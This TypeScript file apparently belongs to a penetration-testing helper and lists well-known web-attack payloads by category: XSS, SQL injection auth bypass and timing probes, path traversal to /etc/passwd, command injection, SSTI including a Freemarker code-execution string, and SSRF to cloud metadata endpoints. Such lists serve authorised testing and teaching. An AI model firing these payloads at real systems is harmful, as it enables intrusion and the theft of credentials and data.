// Curated catalogue of classic test payloads, grouped by category. These are
// the same well-known strings found in public cheatsheets (PayloadsAllTheThings,
// HackTricks) and are meant for authorised testing, CTFs and education.

export interface Payload {
  title: string;
  value: string;
}

export interface PayloadCategory {
  id: string;
  name: string;
  description: string;
  payloads: Payload[];
}

export const CATEGORIES: PayloadCategory[] = [
  {
    id: 'xss',
    name: 'XSS',
    description: 'Cross-site scripting — testar reflexão e execução de scripts.',
    payloads: [
      { title: 'Básico', value: '<script>alert(1)</script>' },
      { title: 'Img onerror', value: '<img src=x onerror=alert(1)>' },
      { title: 'SVG onload', value: '<svg onload=alert(1)>' },
      { title: 'Body onload', value: '<body onload=alert(1)>' },
      { title: 'Atributo (sair de aspas)', value: '"><script>alert(1)</script>' },
      { title: 'JS context', value: "';alert(1)//" },
      { title: 'Sem parênteses', value: '<svg onload=alert`1`>' },
    ],
  },
  {
    id: 'sqli',
    name: 'SQL Injection',
    description: 'Testar interpolação insegura em consultas SQL.',
    payloads: [
      { title: 'Auth bypass', value: "' OR '1'='1" },
      { title: 'Auth bypass (comentário)', value: "' OR 1=1-- -" },
      { title: 'Union (NULLs)', value: "' UNION SELECT NULL,NULL,NULL-- -" },
      { title: 'Versão (MySQL)', value: "' UNION SELECT @@version-- -" },
      { title: 'Time-based (MySQL)', value: "' AND SLEEP(5)-- -" },
      { title: 'Time-based (Postgres)', value: "'||pg_sleep(5)-- -" },
      { title: 'Error-based', value: "' AND extractvalue(1,concat(0x7e,version()))-- -" },
    ],
  },
  {
    id: 'lfi',
    name: 'LFI / Path Traversal',
    description: 'Leitura de arquivos por travessia de diretório.',
    payloads: [
      { title: '/etc/passwd', value: '../../../../../../etc/passwd' },
      { title: 'Null byte (legado)', value: '../../../../etc/passwd%00' },
      { title: 'PHP filter (base64)', value: 'php://filter/convert.base64-encode/resource=index.php' },
      { title: 'Encoded', value: '..%2f..%2f..%2f..%2fetc%2fpasswd' },
      { title: 'Windows hosts', value: '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
    ],
  },
  {
    id: 'cmd',
    name: 'Command Injection',
    description: 'Execução de comandos via concatenação insegura.',
    payloads: [
      { title: 'Separador ;', value: '; id' },
      { title: 'Pipe', value: '| id' },
      { title: 'AND', value: '&& id' },
      { title: 'Substituição', value: '$(id)' },
      { title: 'Backticks', value: '`id`' },
      { title: 'Newline', value: '%0aid' },
    ],
  },
  {
    id: 'ssti',
    name: 'SSTI',
    description: 'Server-side template injection — detecção por avaliação.',
    payloads: [
      { title: 'Detecção genérica', value: '${7*7}' },
      { title: 'Jinja2 / Twig', value: '{{7*7}}' },
      { title: 'Jinja2 config', value: '{{ config.items() }}' },
      { title: 'Freemarker', value: '${"freemarker.template.utility.Execute"?new()("id")}' },
      { title: 'Razor', value: '@(1+1)' },
    ],
  },
  {
    id: 'traversal-proto',
    name: 'SSRF',
    description: 'Server-side request forgery — alvos internos comuns.',
    payloads: [
      { title: 'Localhost', value: 'http://127.0.0.1:80/' },
      { title: 'AWS metadata', value: 'http://169.254.169.254/latest/meta-data/' },
      { title: 'GCP metadata', value: 'http://metadata.google.internal/computeMetadata/v1/' },
      { title: 'File scheme', value: 'file:///etc/passwd' },
      { title: 'Bypass (decimal IP)', value: 'http://2130706433/' },
    ],
  },
];
